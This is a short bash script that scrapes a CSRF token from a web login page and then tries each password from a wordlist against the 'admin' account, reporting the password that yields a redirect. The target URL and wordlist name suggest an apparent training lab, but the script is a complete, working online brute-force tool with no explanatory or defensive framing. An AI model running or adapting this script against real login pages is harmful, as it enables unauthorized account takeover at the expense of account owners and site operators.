#!/usr/bin/env bash
set -euo pipefail
BASE="${1:?usage: $0 https://<instance>-app.web.lms.itmo.xyz}"
WORDLIST="${2:-training-passwords.txt}"

jar="$(mktemp)"
html="$(curl -sS --retry 3 --retry-all-errors -c "$jar" "$BASE/")"
csrf="$(printf '%s' "$html" | grep -o 'name="csrf" value="[^"]*"' | sed 's/.*value="//;s/"//')"

while IFS= read -r pw; do
  [ -z "$pw" ] && continue
  out=$(curl -sS -o /dev/null -b "$jar" \
    -w "%{http_code} %{size_download} %{redirect_url}" \
    --data-urlencode "csrf=$csrf" \
    --data-urlencode "username=admin" \
    --data-urlencode "password=$pw" \
    "$BASE/login")
  echo "$out | $pw"
  case "$out" in 303*) echo "FOUND password: $pw"; break;; esac
done < "$WORDLIST"
